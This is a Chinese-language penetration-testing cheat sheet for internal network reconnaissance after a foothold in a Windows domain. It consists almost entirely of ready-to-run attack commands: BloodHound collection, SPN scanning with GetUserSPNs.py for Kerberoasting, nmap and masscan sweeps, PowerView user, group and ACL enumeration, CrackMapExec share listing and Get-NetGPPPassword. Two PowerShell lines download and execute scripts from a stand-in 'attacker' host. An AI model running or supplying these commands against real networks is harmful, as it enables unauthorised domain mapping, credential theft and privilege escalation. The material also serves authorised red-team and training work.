# 内网信息收集

## 1. BloodHound域分析

### SharpHound采集

```bash
SharpHound.exe -c All
```

### PowerShell采集

```bash
IEX(New-Object Net.WebClient).DownloadString("http://attacker/SharpHound.ps1"); Invoke-BloodHound -CollectionMethod All
```

### Python版采集

```bash
bloodhound-python -u user -p password -d target.com -ns dc_ip
```

### Cypher查询

```cypher
MATCH (n:User) WHERE n.admincount=true RETURN n
MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE m.name="DOMAIN ADMINS@DOMAIN.COM" RETURN p
```

---

## 2. SPN扫描

### Windows

```bash
setspn -T domain.com -Q */*
setspn -T domain.com -Q HTTP/*
setspn -T domain.com -Q MSSQLSvc/*
```

### PowerShell

```powershell
Get-ADUser -Filter {ServicePrincipalName -like "*"} -Properties ServicePrincipalName
```

### Impacket

```bash
GetUserSPNs.py domain/user:password -dc-ip dc_ip
```

---

## 3. 端口扫描

### Nmap

```bash
nmap -sS -T4 -F 192.168.1.0/24           # 快速扫描
nmap -sS -p- 192.168.1.1                  # 全端口扫描
nmap -sV -sC 192.168.1.1                  # 服务识别
nmap -sn 192.168.1.0/24                    # 存活探测
nmap -O 192.168.1.1                       # 操作系统识别
nmap -sU --top-ports 20 192.168.1.1       # UDP扫描
nmap --script vuln 192.168.1.1             # 漏洞扫描
```

### Masscan

```bash
masscan -p1-65535 192.168.1.0/24 --rate=1000
```

---

## 4. 域信息收集

```bash
net config workstation
nltest /dclist:domain.com
net user /domain
net group "Domain Admins" /domain
nltest /domain_trusts
```

### PowerView

```powershell
IEX(New-Object Net.WebClient).DownloadString("http://attacker/PowerView.ps1")
Get-NetDomain
Get-NetDomainController
Get-NetUser
Get-NetGroup
Get-NetComputer
```

---

## 5. 网络信息收集

### Windows

```bash
ipconfig /all
route print
arp -a
netstat -ano
ipconfig /displaydns
```

### Linux

```bash
ifconfig -a
route -n
arp -a
netstat -tunlp
```

---

## 6. 共享枚举

```bash
net share
net view \\target_ip
```

### SMBMap

```bash
smbmap -H target_ip -u user -p password
smbmap -H target_ip -u user -p password -R
```

### CrackMapExec

```bash
crackmapexec smb target_ip -u user -p password --shares
```

---

## 7. 用户枚举

```bash
net user /domain
net user username /domain
```

### PowerView

```powershell
Get-NetUser | select samaccountname,description,admincount
Get-NetUser -AdminCount | select samaccountname
```

---

## 8. 组枚举

```bash
net group /domain
net group "Domain Admins" /domain
```

### PowerView

```powershell
Get-NetGroup | select samaccountname,admincount
Get-NetGroup -AdminCount
Get-NetGroupMember "Domain Admins" -Recurse
```

---

## 9. GPO枚举

```powershell
Get-GPO -All
Get-NetGPO
Get-NetGPPPassword
```

---

## 10. ACL枚举

```powershell
Get-ObjectAcl -SamAccountName user -ResolveGUIDs
Find-InterestingDomainAcl -ResolveGUIDs
```
